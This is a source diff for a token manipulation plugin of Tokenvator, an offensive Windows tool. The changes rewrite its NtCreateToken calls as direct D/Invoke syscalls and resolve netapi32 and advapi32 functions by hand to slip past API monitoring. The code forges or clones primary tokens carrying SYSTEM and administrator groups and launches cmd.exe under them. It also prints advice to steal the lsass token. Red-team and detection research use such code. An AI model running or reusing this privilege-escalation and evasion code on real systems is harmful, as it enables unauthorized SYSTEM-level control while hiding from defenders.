@@ -1,23 +1,29 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Linq;
 using System.Runtime.InteropServices;
+using System.Security.Principal;
 using System.Text;
+
+using DInvoke.DynamicInvoke;
 
 using Tokenvator.Resources;
 using Tokenvator.Plugins.Enumeration;
 
 using MonkeyWorks.Unmanaged.Headers;
+using System.Runtime.ExceptionServices;
+using System.Security;
 using MonkeyWorks.Unmanaged.Libraries;
-
-using System.Security.Principal;
 
 namespace Tokenvator.Plugins.AccessTokens
 {
+    using MonkeyWorks = MonkeyWorks.Unmanaged.Libraries.DInvoke;
+
     //https://stackoverflow.com/questions/21716527/in-windows-how-do-you-programatically-launch-a-process-in-administrator-mode-un/21718198#21718198
 
     class CreateTokens : AccessTokens
     {
+        private bool ctDisposed = false;
+
         private uint localEntriesRead = 0;
         private uint localTotalEntriesRead = 0;
 
@@ -26,12 +32,58 @@ namespace Tokenvator.Plugins.AccessTokens
 
         private int extraGroups = 0;
 
+        private IntPtr hSecurityContextTrackingMode;
+
+        ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// Default Constructor
+        /// </summary>
+        /// <param name="token"></param>
+        ////////////////////////////////////////////////////////////////////////////////
         public CreateTokens(IntPtr token) : base(token)
         {
             SetWorkingTokenToSelf();
         }
 
-        //SeCreateTokenPrivilege
+        ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// Default destructor
+        /// </summary>
+        ////////////////////////////////////////////////////////////////////////////////
+        ~CreateTokens()
+        {
+            if (!ctDisposed)
+            {
+                Dispose();
+            }
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// IDisposable to free the allocated pointers
+        /// </summary>
+        ////////////////////////////////////////////////////////////////////////////////
+        public override void Dispose()
+        {
+            ctDisposed = true;
+
+            if (IntPtr.Zero != hSecurityContextTrackingMode)
+            {
+                Marshal.FreeHGlobal(hSecurityContextTrackingMode);
+            }
+
+            base.Dispose();
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// Creates a duplicate of the currently calling token
+        /// Converted to D/Invoke Syscalls
+        /// </summary>
+        /// <param name="command"></param>
+        ////////////////////////////////////////////////////////////////////////////////
+        [SecurityCritical]
+        [HandleProcessCorruptedStateExceptions]
         public void CreateToken(string command)
         {
             if (!_CheckPrivileges())
@@ -39,20 +91,17 @@ namespace Tokenvator.Plugins.AccessTokens
                 return;
             }
 
-            //uint LG_INCLUDE_INDIRECT = 0x0001;
-            //uint MAX_PREFERRED_LENGTH = 0xFFFFFFFF;
-
             Console.WriteLine();
             Console.WriteLine("_SECURITY_QUALITY_OF_SERVICE");
             Winnt._SECURITY_QUALITY_OF_SERVICE securityContextTrackingMode = new Winnt._SECURITY_QUALITY_OF_SERVICE()
             {
                 Length = (uint)Marshal.SizeOf(typeof(Winnt._SECURITY_QUALITY_OF_SERVICE)),
-                ImpersonationLevel = Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,//SecurityAnonymous
+                ImpersonationLevel = Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                 ContextTrackingMode = Winnt.SECURITY_CONTEXT_TRACKING_MODE.SECURITY_STATIC_TRACKING,
                 EffectiveOnly = Winnt.EFFECTIVE_ONLY.False
             };
 
-            IntPtr hSecurityContextTrackingMode = Marshal.AllocHGlobal(Marshal.SizeOf(securityContextTrackingMode));
+            hSecurityContextTrackingMode = Marshal.AllocHGlobal(Marshal.SizeOf(securityContextTrackingMode));
             Marshal.StructureToPtr(securityContextTrackingMode, hSecurityContextTrackingMode, false);
 
             Console.WriteLine("_OBJECT_ATTRIBUTES");
@@ -66,39 +115,51 @@ namespace Tokenvator.Plugins.AccessTokens
                 SecurityQualityOfService = hSecurityContextTrackingMode
             };
 
-            TokenInformation ti = new TokenInformation(hWorkingToken);
-            ti.SetWorkingTokenToSelf();
+            uint ntRetVal = 0;
+            using (TokenInformation ti = new TokenInformation(hWorkingToken))
+            {
+                ti.SetWorkingTokenToSelf();
 
-            ti.GetTokenSource();
-            ti.GetTokenUser();
-            ti.GetTokenGroups();
-            ti.GetTokenPrivileges();
-            ti.GetTokenOwner();
-            ti.GetTokenPrimaryGroup();
-            ti.GetTokenDefaultDacl();
+                ti.GetTokenSource();
+                ti.GetTokenUser();
+                ti.GetTokenGroups();
+                ti.GetTokenPrivileges();
+                ti.GetTokenOwner();
+                ti.GetTokenPrimaryGroup();
+                ti.GetTokenDefaultDacl();
 
-            Winnt._LUID systemLuid = Winnt.SYSTEM_LUID;
-            long expirationTime = long.MaxValue / 2;
+                Winnt._LUID systemLuid = Winnt.SYSTEM_LUID;
+                long expirationTime = long.MaxValue / 2;
 
-            phNewToken = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
+                phNewToken = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
 
-            //out/ref hToken - required
-            //Ref Expirationtime - required
-            uint ntRetVal = ntdll.NtCreateToken(
-                out phNewToken,
-                Winnt.TOKEN_ALL_ACCESS,
-                ref objectAttributes,
-                Winnt._TOKEN_TYPE.TokenPrimary,
-                ref systemLuid,
-                ref expirationTime,
-                ref ti.tokenUser,
-                ref ti.tokenGroups,
-                ref ti.tokenPrivileges,
-                ref ti.tokenOwner,
-                ref ti.tokenPrimaryGroup,
-                ref ti.tokenDefaultDacl,
-                ref ti.tokenSource
-            );
+                IntPtr hNtCreateToken = Generic.GetSyscallStub("NtCreateToken");
+                MonkeyWorks.ntdll.NtCreateToken fSyscallNtCreateToken = (MonkeyWorks.ntdll.NtCreateToken)Marshal.GetDelegateForFunctionPointer(hNtCreateToken, typeof(MonkeyWorks.ntdll.NtCreateToken));
+
+                try
+                {
+                    ntRetVal = fSyscallNtCreateToken(
+                        out phNewToken,
+                        Winnt.TOKEN_ALL_ACCESS,
+                        ref objectAttributes,
+                        Winnt._TOKEN_TYPE.TokenPrimary,
+                        ref systemLuid,
+                        ref expirationTime,
+                        ref ti.tokenUser,
+                        ref ti.tokenGroups,
+                        ref ti.tokenPrivileges,
+                        ref ti.tokenOwner,
+                        ref ti.tokenPrimaryGroup,
+                        ref ti.tokenDefaultDacl,
+                        ref ti.tokenSource
+                    );
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("[-] NtCreateToken Generated an Exception");
+                    Console.WriteLine(ex.Message);
+                }
+            }
 
             if (0 != ntRetVal)
             {
@@ -115,7 +176,15 @@ namespace Tokenvator.Plugins.AccessTokens
             StartProcessAsUser(command);
         }
 
-        //SeCreateTokenPrivilege
+        ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// Creates a token from scratch with additinal groups allowed
+        /// Converted to D/Invoke Syscalls
+        /// </summary>
+        /// <param name="command"></param>
+        ////////////////////////////////////////////////////////////////////////////////
+        [SecurityCritical]
+        [HandleProcessCorruptedStateExceptions]
         public void CreateToken(string userName, string[] groups, string command)
         {
             Console.WriteLine("[*] Creating Token for {0}", userName);
@@ -124,8 +193,6 @@ namespace Tokenvator.Plugins.AccessTokens
             {
                 return;
             }
-            
-            //uint MAX_PREFERRED_LENGTH = 0xFFFFFFFF;
 
             #region _OBJECT_ATTRIBUTES
             Console.WriteLine();
@@ -138,7 +205,7 @@ namespace Tokenvator.Plugins.AccessTokens
                 EffectiveOnly = Winnt.EFFECTIVE_ONLY.False
             };
 
-            IntPtr hSecurityContextTrackingMode = Marshal.AllocHGlobal(Marshal.SizeOf(securityContextTrackingMode));
+            hSecurityContextTrackingMode = Marshal.AllocHGlobal(Marshal.SizeOf(securityContextTrackingMode));
             Marshal.StructureToPtr(securityContextTrackingMode, hSecurityContextTrackingMode, false);
 
             Console.WriteLine("[*] _OBJECT_ATTRIBUTES");
@@ -184,23 +251,33 @@ namespace Tokenvator.Plugins.AccessTokens
 
             phNewToken = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
 
-            //out/ref hToken - required
-            //Ref Expirationtime - required
-            uint ntRetVal = ntdll.NtCreateToken(
-                out phNewToken,
-                Winnt.TOKEN_ALL_ACCESS,
-                ref objectAttributes,
-                Winnt._TOKEN_TYPE.TokenPrimary,
-                ref systemLuid,
-                ref expirationTime,
-                ref tokenUser,
-                ref tokenGroups,
-                ref tokenPrivileges,
-                ref tokenOwner,
-                ref tokenPrimaryGroup,
-                ref tokenDefaultDacl,
-                ref tokenSource
-            );
+            IntPtr hNtCreateToken = Generic.GetSyscallStub("NtCreateToken");
+            MonkeyWorks.ntdll.NtCreateToken fSyscallNtCreateToken = (MonkeyWorks.ntdll.NtCreateToken)Marshal.GetDelegateForFunctionPointer(hNtCreateToken, typeof(MonkeyWorks.ntdll.NtCreateToken));
+
+            uint ntRetVal = 0;
+            try
+            {
+                ntRetVal = fSyscallNtCreateToken(
+                    out phNewToken,
+                    Winnt.TOKEN_ALL_ACCESS,
+                    ref objectAttributes,
+                    Winnt._TOKEN_TYPE.TokenPrimary,
+                    ref systemLuid,
+                    ref expirationTime,
+                    ref tokenUser,
+                    ref tokenGroups,
+                    ref tokenPrivileges,
+                    ref tokenOwner,
+                    ref tokenPrimaryGroup,
+                    ref tokenDefaultDacl,
+                    ref tokenSource
+                );
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] NtCreateToken Generated an Exception");
+                Console.WriteLine(ex.Message);
+            }
 
             if (0 != ntRetVal)
             {
@@ -208,12 +285,13 @@ namespace Tokenvator.Plugins.AccessTokens
                 return;
             }
 
-
             Console.WriteLine();
 
-            DesktopACL desktop = new DesktopACL();
-            desktop.OpenDesktop();
-            desktop.OpenWindow();
+            using (DesktopACL desktop = new DesktopACL())
+            {
+                desktop.OpenDesktop();
+                desktop.OpenWindow();
+            }
 
             Console.WriteLine();
 
@@ -221,10 +299,20 @@ namespace Tokenvator.Plugins.AccessTokens
             {
                 command = "cmd.exe";
             }
+
             SetWorkingTokenToNewToken();
-            StartProcessAsUser(command);         
+            StartProcessAsUser(command);
         }
 
+        ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// Clones a remote access token to create a process off of it
+        /// Converted to D/Invoke Syscalls
+        /// </summary>
+        /// <param name="command"></param>
+        ////////////////////////////////////////////////////////////////////////////////
+        [SecurityCritical]
+        [HandleProcessCorruptedStateExceptions]
         public void CloneToken(int processId, string command)
         {
             if (!_CheckPrivileges())
@@ -237,12 +325,12 @@ namespace Tokenvator.Plugins.AccessTokens
             Winnt._SECURITY_QUALITY_OF_SERVICE securityContextTrackingMode = new Winnt._SECURITY_QUALITY_OF_SERVICE()
             {
                 Length = (uint)Marshal.SizeOf(typeof(Winnt._SECURITY_QUALITY_OF_SERVICE)),
-                ImpersonationLevel = Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,//SecurityAnonymous
+                ImpersonationLevel = Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                 ContextTrackingMode = Winnt.SECURITY_CONTEXT_TRACKING_MODE.SECURITY_STATIC_TRACKING,
                 EffectiveOnly = Winnt.EFFECTIVE_ONLY.False
             };
 
-            IntPtr hSecurityContextTrackingMode = Marshal.AllocHGlobal(Marshal.SizeOf(securityContextTrackingMode));
+            hSecurityContextTrackingMode = Marshal.AllocHGlobal(Marshal.SizeOf(securityContextTrackingMode));
             Marshal.StructureToPtr(securityContextTrackingMode, hSecurityContextTrackingMode, false);
 
             Console.WriteLine("_OBJECT_ATTRIBUTES");
@@ -256,41 +344,44 @@ namespace Tokenvator.Plugins.AccessTokens
                 SecurityQualityOfService = hSecurityContextTrackingMode
             };
 
-            TokenInformation ti = new TokenInformation(hWorkingToken);
-            //ti.SetWorkingTokenToRemote();
-            ti.OpenProcessToken(processId);
-            ti.SetWorkingTokenToRemote();
+            uint ntRetVal = 0;
+            using (TokenInformation ti = new TokenInformation(hWorkingToken))
+            {
+                ti.OpenProcessToken(processId);
+                ti.SetWorkingTokenToRemote();
 
-            ti.GetTokenSource();
-            ti.GetTokenUser();
-            ti.GetTokenGroups();
-            ti.GetTokenPrivileges();
-            ti.GetTokenOwner();
-            ti.GetTokenPrimaryGroup();
-            ti.GetTokenDefaultDacl();
+                ti.GetTokenSource();
+                ti.GetTokenUser();
+                ti.GetTokenGroups();
+                ti.GetTokenPrivileges();
+                ti.GetTokenOwner();
+                ti.GetTokenPrimaryGroup();
+                ti.GetTokenDefaultDacl();
 
-            Winnt._LUID systemLuid = Winnt.SYSTEM_LUID;
-            long expirationTime = long.MaxValue / 2;
+                Winnt._LUID systemLuid = Winnt.SYSTEM_LUID;
+                long expirationTime = long.MaxValue / 2;
 
-            phNewToken = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
+                phNewToken = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
 
-            //out/ref hToken - required
-            //Ref Expirationtime - required
-            uint ntRetVal = ntdll.NtCreateToken(
-                out phNewToken,
-                Winnt.TOKEN_ALL_ACCESS,
-                ref objectAttributes,
-                Winnt._TOKEN_TYPE.TokenPrimary,
-                ref systemLuid,
-                ref expirationTime,
-                ref ti.tokenUser,
-                ref ti.tokenGroups,
-                ref ti.tokenPrivileges,
-                ref ti.tokenOwner,
-                ref ti.tokenPrimaryGroup,
-                ref ti.tokenDefaultDacl,
-                ref ti.tokenSource
-            );
+                IntPtr hNtCreateToken = Generic.GetSyscallStub("NtCreateToken");
+                MonkeyWorks.ntdll.NtCreateToken fSyscallNtCreateToken = (MonkeyWorks.ntdll.NtCreateToken)Marshal.GetDelegateForFunctionPointer(hNtCreateToken, typeof(MonkeyWorks.ntdll.NtCreateToken));
+
+                ntRetVal = fSyscallNtCreateToken(
+                    out phNewToken,
+                    Winnt.TOKEN_ALL_ACCESS,
+                    ref objectAttributes,
+                    Winnt._TOKEN_TYPE.TokenPrimary,
+                    ref systemLuid,
+                    ref expirationTime,
+                    ref ti.tokenUser,
+                    ref ti.tokenGroups,
+                    ref ti.tokenPrivileges,
+                    ref ti.tokenOwner,
+                    ref ti.tokenPrimaryGroup,
+                    ref ti.tokenDefaultDacl,
+                    ref ti.tokenSource
+                );
+            }
 
             if (0 != ntRetVal)
             {
@@ -310,9 +401,17 @@ namespace Tokenvator.Plugins.AccessTokens
             }
 
             SetWorkingTokenToNewToken();
-            StartProcessAsUser(command);           
+            StartProcessAsUser(command);
         }
 
+        ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// Checks if SeCreateTokenPrivilege & SeSecurityPrivilege is present and enabled 
+        /// on the token if it present but not enabled on the token, it is automatically 
+        /// enabled
+        /// </summary>
+        /// <param name="command"></param>
+        ////////////////////////////////////////////////////////////////////////////////
         private bool _CheckPrivileges()
         {
             bool exists, enabled;
@@ -320,79 +419,87 @@ namespace Tokenvator.Plugins.AccessTokens
             using (TokenInformation ti = new TokenInformation(hWorkingToken))
             {
                 ti.SetWorkingTokenToSelf();
+
+                ////////////////////////////////////////////////////////////////////////////////
+                // Checks if SeCreateTokenPrivilege is present and enabled on the token
+                // if it present but not enabled on the token, it is automatically enabled
+                ////////////////////////////////////////////////////////////////////////////////
                 if (!ti.CheckTokenPrivilege(Winnt.SE_CREATETOKEN_NAME, out exists, out enabled))
                 {
                     Console.WriteLine("[-] Check Token Privilege Failed");
                     return false;
                 }
-            }
-
-            if (!exists)
-            {
-                Console.WriteLine("[-] {0} is not present on the token", Winnt.SE_CREATETOKEN_NAME);
-                Console.WriteLine("[-] Steal_Token lsass cmd.exe");
-                Console.WriteLine("[-] Add_Privilege SeCreateTokenPrivilege");
-                return false;
-            }
-
-            if (!enabled)
-            {
-                Console.WriteLine("[-] {0} is not enabled on the token", Winnt.SE_CREATETOKEN_NAME);
-                Console.WriteLine("[*] Enabling {0} on the token", Winnt.SE_CREATETOKEN_NAME);
-                using (TokenManipulation tm = new TokenManipulation(hWorkingToken))
+                if (!exists)
                 {
-                    tm.SetWorkingTokenToSelf();
-                    if (!tm.SetTokenPrivilege(Winnt.SE_CREATETOKEN_NAME, Winnt.TokenPrivileges.SE_PRIVILEGE_ENABLED))
+                    Console.WriteLine("[-] {0} is not present on the token", Winnt.SE_CREATETOKEN_NAME);
+                    Console.WriteLine("[-] Steal_Token lsass cmd.exe");
+                    Console.WriteLine("[-] Add_Privilege SeCreateTokenPrivilege");
+                    return false;
+                }
+                if (!enabled)
+                {
+                    Console.WriteLine("[-] {0} is not enabled on the token", Winnt.SE_CREATETOKEN_NAME);
+                    Console.WriteLine("[*] Enabling {0} on the token", Winnt.SE_CREATETOKEN_NAME);
+                    using (TokenManipulation tm = new TokenManipulation(hWorkingToken))
                     {
-                        return false;   
+                        tm.SetWorkingTokenToSelf();
+                        if (!tm.SetTokenPrivilege(Winnt.SE_CREATETOKEN_NAME, Winnt.TokenPrivileges.SE_PRIVILEGE_ENABLED))
+                        {
+                            return false;
+                        }
                     }
                 }
-            }
-            else
-            {
-                Console.WriteLine("[+] {0} is present and enabled on the token", Winnt.SE_CREATETOKEN_NAME);
-            }
+                else
+                {
+                    Console.WriteLine("[+] {0} is present and enabled on the token", Winnt.SE_CREATETOKEN_NAME);
+                }
 
-            using (TokenInformation ti = new TokenInformation(hWorkingToken))
-            {
-                ti.SetWorkingTokenToSelf();
+                ////////////////////////////////////////////////////////////////////////////////
+                // Checks if SeSecurityPrivilege is present and enabled on the token
+                // if it present but not enabled on the token, it is automatically enabled
+                ////////////////////////////////////////////////////////////////////////////////
                 if (!ti.CheckTokenPrivilege(Winnt.SE_SECURITY_NAME, out exists, out enabled))
                 {
                     Console.WriteLine("[-] Check Token Privilege Failed");
                     return false;
                 }
-
-            }
-
-            if (!exists)
-            {
-                Console.WriteLine("[-] {0} is not present on the token", Winnt.SE_SECURITY_NAME);
-                Console.WriteLine("[-] This should be present on existing high integrity tokens");
-                Console.WriteLine("[-] Add_Privilege SeCreateTokenPrivilege");
-                return false;
-            }
-
-            if (!enabled)
-            {
-                Console.WriteLine("[-] {0} is not enabled on the token", Winnt.SE_SECURITY_NAME);
-                Console.WriteLine("[*] Enabling {0} on the token", Winnt.SE_SECURITY_NAME);
-                using (TokenManipulation tm = new TokenManipulation(hWorkingToken))
+                if (!exists)
                 {
-                    tm.SetWorkingTokenToSelf();
-                    if (!tm.SetTokenPrivilege(Winnt.SE_SECURITY_NAME, Winnt.TokenPrivileges.SE_PRIVILEGE_ENABLED))
+                    Console.WriteLine("[-] {0} is not present on the token", Winnt.SE_SECURITY_NAME);
+                    Console.WriteLine("[-] This should be present on existing high integrity tokens");
+                    Console.WriteLine("[-] Add_Privilege SeCreateTokenPrivilege");
+                    return false;
+                }
+                if (!enabled)
+                {
+                    Console.WriteLine("[-] {0} is not enabled on the token", Winnt.SE_SECURITY_NAME);
+                    Console.WriteLine("[*] Enabling {0} on the token", Winnt.SE_SECURITY_NAME);
+                    using (TokenManipulation tm = new TokenManipulation(hWorkingToken))
                     {
-                        return false;
+                        tm.SetWorkingTokenToSelf();
+                        if (!tm.SetTokenPrivilege(Winnt.SE_SECURITY_NAME, Winnt.TokenPrivileges.SE_PRIVILEGE_ENABLED))
+                        {
+                            return false;
+                        }
                     }
                 }
-            }
-            else
-            {
-                Console.WriteLine("[+] {0} is present and enabled on the token", Winnt.SE_CREATETOKEN_NAME);
+                else
+                {
+                    Console.WriteLine("[+] {0} is present and enabled on the token", Winnt.SE_CREATETOKEN_NAME);
+                }
             }
 
             return true;
         }
 
+        ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// Creates the TOKEN_USER Structure
+        /// No Conversions Required
+        /// enabled
+        /// </summary>
+        /// <param name="command"></param>
+        ////////////////////////////////////////////////////////////////////////////////
         private bool CreateTokenUser(string domain, string userName, out Ntifs._TOKEN_USER tokenUser)
         {
             Console.WriteLine("[*] Creating _TOKEN_USER");
@@ -408,21 +515,45 @@ namespace Tokenvator.Plugins.AccessTokens
             return true;
         }
 
+        ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// Creates the TOKEN_GROUPS Structure
+        /// Converted to D/Invoke GetPebLdrModuleEntry/GetExportAddress/LoadModuleFromDisk
+        /// </summary>
+        /// <param name="command"></param>
+        /// <returns></returns>
+        ////////////////////////////////////////////////////////////////////////////////
         internal bool CreateTokenGroups(string domain, string userName, out Ntifs._TOKEN_GROUPS tokenGroups, out Winnt._TOKEN_PRIMARY_GROUP tokenPrimaryGroup, string[] groups)
         {
-            uint LG_INCLUDE_INDIRECT = 0x0001;
-
             Console.WriteLine("[*] _TOKEN_GROUPS");
 
             tokenGroups = new Ntifs._TOKEN_GROUPS();
             tokenGroups.Initialize();
             tokenPrimaryGroup = new Winnt._TOKEN_PRIMARY_GROUP();
 
-            #region NetUserGetLocalGroups
-            //Console.WriteLine(" - NetUserGetLocalGroups");
+            IntPtr hnetapi32 = Generic.GetPebLdrModuleEntry("netapi32.dll");
+            if (IntPtr.Zero == hnetapi32)
+            {
+                hnetapi32 = Generic.LoadModuleFromDisk("netapi32.dll");
+                if (IntPtr.Zero == hnetapi32)
+                {
+                    Console.WriteLine("Unable to load netapi32.dll");
+                    return false;
+                }
+            }
 
-            lmaccess._LOCALGROUP_USERS_INFO_0[] localgroupUserInfo = new lmaccess._LOCALGROUP_USERS_INFO_0[0];
-            IntPtr bufPtr;
+            uint LG_INCLUDE_INDIRECT = 0x0001;
+
+            #region NetUserGetLocalGroups
+            ////////////////////////////////////////////////////////////////////////////////
+            // ntRetVal = netapi32.NetUserGetLocalGroups(domain, userName.ToLower(), 0, LG_INCLUDE_INDIRECT, out bufPtr, -1, ref localEntriesRead, ref localTotalEntriesRead);
+            ////////////////////////////////////////////////////////////////////////////////
+            IntPtr hNetUserGetLocalGroups = Generic.GetExportAddress(hnetapi32, "NetUserGetLocalGroups");
+            MonkeyWorks.netapi32.NetUserGetLocalGroups fNetUserGetLocalGroups = (MonkeyWorks.netapi32.NetUserGetLocalGroups)Marshal.GetDelegateForFunctionPointer(hNetUserGetLocalGroups, typeof(MonkeyWorks.netapi32.NetUserGetLocalGroups));
+
+            lmaccess._LOCALGROUP_USERS_INFO_0[] localgroupUserInfo;
+            IntPtr bufPtr = IntPtr.Zero;
+
             uint ntRetVal = netapi32.NetUserGetLocalGroups(
                 domain,
                 userName.ToLower(),
@@ -434,9 +565,30 @@ namespace Tokenvator.Plugins.AccessTokens
                 ref localTotalEntriesRead
             );
 
+            /*
+            try
+            {
+                ntRetVal = fNetUserGetLocalGroups(
+                    domain,
+                    userName.ToLower(),
+                    0,
+                    LG_INCLUDE_INDIRECT,
+                    out bufPtr,
+                    -1,
+                    ref localEntriesRead,
+                    ref localTotalEntriesRead
+                );
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] NetUserGetLocalGroups Generated an Exception");
+                Console.WriteLine(ex);
+            }
+            */
             if (0 != ntRetVal)
             {
-                Misc.GetNtError("NetUserGetLocalGroups", ntRetVal);
+                Misc.GetNetApiError("NetUserGetLocalGroups", ntRetVal);
+
             }
 
             localgroupUserInfo = new lmaccess._LOCALGROUP_USERS_INFO_0[localEntriesRead];
@@ -445,27 +597,49 @@ namespace Tokenvator.Plugins.AccessTokens
 
             for (int i = 0; i < localEntriesRead; i++)
             {
-                var itemPtr = new IntPtr(bufPtr.ToInt64() + (Marshal.SizeOf(typeof(lmaccess._LOCALGROUP_USERS_INFO_0)) * i));
-                localgroupUserInfo[i] = (lmaccess._LOCALGROUP_USERS_INFO_0)Marshal.PtrToStructure(itemPtr, typeof(lmaccess._LOCALGROUP_USERS_INFO_0));
-                Console.WriteLine(" [+] {0}", localgroupUserInfo[i].lgrui0_name);
+                try
+                {
+                    var itemPtr = new IntPtr(bufPtr.ToInt64() + (Marshal.SizeOf(typeof(lmaccess._LOCALGROUP_USERS_INFO_0)) * i));
+                    localgroupUserInfo[i] = (lmaccess._LOCALGROUP_USERS_INFO_0)Marshal.PtrToStructure(itemPtr, typeof(lmaccess._LOCALGROUP_USERS_INFO_0));
+                    Console.WriteLine(" [+] {0}", localgroupUserInfo[i].lgrui0_name);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("[-] PtrToStructure Generated an Exception");
+                    Console.WriteLine(ex.Message);
+                }
             }
             #endregion
 
             #region NetUserGetGroups
-            lmaccess._GROUP_USERS_INFO_0[] globalGroupUserInfo;// = new lmaccess._GROUP_USERS_INFO_0[0];
-            ntRetVal = netapi32.NetUserGetGroups(
-                domain,
-                userName.ToLower(),
-                0,
-                out bufPtr,
-                -1,
-                ref globalEntriesRead,
-                ref globalEotalEntriesRead
-            );
+            ////////////////////////////////////////////////////////////////////////////////
+            //netapi32.NetUserGetGroups(domain, userName.ToLower(), 0, out bufPtr, -1, ref globalEntriesRead, ref globalEotalEntriesRead);
+            ////////////////////////////////////////////////////////////////////////////////
+            IntPtr hNetUserGetGroups = Generic.GetExportAddress(hnetapi32, "NetUserGetGroups");
+            MonkeyWorks.netapi32.NetUserGetGroups fNetUserGetGroups = (MonkeyWorks.netapi32.NetUserGetGroups)Marshal.GetDelegateForFunctionPointer(hNetUserGetGroups, typeof(MonkeyWorks.netapi32.NetUserGetGroups));
+
+            lmaccess._GROUP_USERS_INFO_0[] globalGroupUserInfo;
+            try
+            {
+                ntRetVal = netapi32.NetUserGetGroups(
+                    domain,
+                    userName.ToLower(),
+                    0,
+                    out bufPtr,
+                    -1,
+                    ref globalEntriesRead,
+                    ref globalEotalEntriesRead
+                );
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] NetUserGetGroups Generated an Exception");
+                Console.WriteLine(ex.Message);
+            }
 
             if (0 != ntRetVal)
             {
-                Misc.GetNtError("NetUserGetGroups", ntRetVal);
+                Misc.GetNetApiError("NetUserGetGroups", ntRetVal);
             }
 
             globalGroupUserInfo = new lmaccess._GROUP_USERS_INFO_0[globalEntriesRead];
@@ -474,15 +648,21 @@ namespace Tokenvator.Plugins.AccessTokens
 
             for (int i = 0; i < localEntriesRead; i++)
             {
-                var itemPtr = new IntPtr(bufPtr.ToInt64() + (Marshal.SizeOf(typeof(lmaccess._GROUP_USERS_INFO_0)) * i));
-                globalGroupUserInfo[i] = (lmaccess._GROUP_USERS_INFO_0)Marshal.PtrToStructure(itemPtr, typeof(lmaccess._GROUP_USERS_INFO_0));
-                Console.WriteLine(" [+] {0}", globalGroupUserInfo[i].grui0_name);
+                try
+                {
+                    var itemPtr = new IntPtr(bufPtr.ToInt64() + (Marshal.SizeOf(typeof(lmaccess._GROUP_USERS_INFO_0)) * i));
+                    globalGroupUserInfo[i] = (lmaccess._GROUP_USERS_INFO_0)Marshal.PtrToStructure(itemPtr, typeof(lmaccess._GROUP_USERS_INFO_0));
+                    Console.WriteLine(" [+] {0}", globalGroupUserInfo[i].grui0_name);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("[-] PtrToStructure Generated an Exception");
+                    Console.WriteLine(ex.Message);
+                }
             }
             #endregion
 
             #region Default Admin Entries
-
-            Console.WriteLine("[+] Default Admin Entries: {0}");
 
             uint groupsAttributes = (uint)(Winnt.SE_GROUP_ENABLED | Winnt.SE_GROUP_ENABLED_BY_DEFAULT | Winnt.SE_GROUP_MANDATORY);
 
@@ -536,9 +716,6 @@ namespace Tokenvator.Plugins.AccessTokens
             #endregion
 
             #region Custom Groups
-
-            Console.WriteLine("[+] Custom Entries: {0}");
-
             //Custom groups
             foreach (string group in groups)
             {
@@ -550,17 +727,9 @@ namespace Tokenvator.Plugins.AccessTokens
                     d = split[0];
                     groupname = split[1];
                 }
-
-                try
-                {
-                    string sid = new NTAccount(d, groupname).Translate(typeof(SecurityIdentifier)).Value;
-                    InitializeSid(sid, ref tokenGroups.Groups[extraGroups].Sid);
-                    tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;
-                }
-                catch (IdentityNotMappedException ex)
-                {
-                    Console.WriteLine(ex.Message);
-                }
+                string sid = new NTAccount(d, groupname).Translate(typeof(SecurityIdentifier)).Value;
+                InitializeSid(sid, ref tokenGroups.Groups[extraGroups].Sid);
+                tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;
             }
             #endregion
 
@@ -601,19 +770,33 @@ namespace Tokenvator.Plugins.AccessTokens
             {
                 string sid, account;
                 TokenInformation.ReadSidAndName(tokenGroups.Groups[i].Sid, out sid, out account);
-                Console.WriteLine(" ({0}) {1,-50} {2}", i, sid, account);
+                Console.WriteLine(" ({0}) {1,-20} {2}", i, sid, account);
             }
 
             return true;
         }
 
+        ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// Creates the TOKEN_PRIVILEGES Structure
+        /// Converted to D/Invoke GetPebLdrModuleEntry/GetExportAddress
+        /// </summary>
+        /// <param name="tokenUser"></param>
+        /// <param name="tokenGroups"></param>
+        /// <param name="tokenPrivileges"></param>
+        /// <returns></returns>
+        ////////////////////////////////////////////////////////////////////////////////
+        [SecurityCritical]
+        [HandleProcessCorruptedStateExceptions]
         private bool CreateTokenPrivileges(Ntifs._TOKEN_USER tokenUser, Ntifs._TOKEN_GROUPS tokenGroups, out Winnt._TOKEN_PRIVILEGES_ARRAY tokenPrivileges)
         {
             Console.WriteLine("[*] _TOKEN_PRIVILEGES");
 
-            tokenPrivileges = new Winnt._TOKEN_PRIVILEGES_ARRAY();
+            IntPtr hadvapi32 = Generic.GetPebLdrModuleEntry("advapi32.dll");
+            IntPtr hLsaOpenPolicy = Generic.GetExportAddress(hadvapi32, "LsaOpenPolicy");
+            MonkeyWorks.advapi32.LsaOpenPolicy fLsaOpenPolicy = (MonkeyWorks.advapi32.LsaOpenPolicy)Marshal.GetDelegateForFunctionPointer(hLsaOpenPolicy, typeof(MonkeyWorks.advapi32.LsaOpenPolicy));
 
-            //Console.WriteLine(" - LsaOpenPolicy");
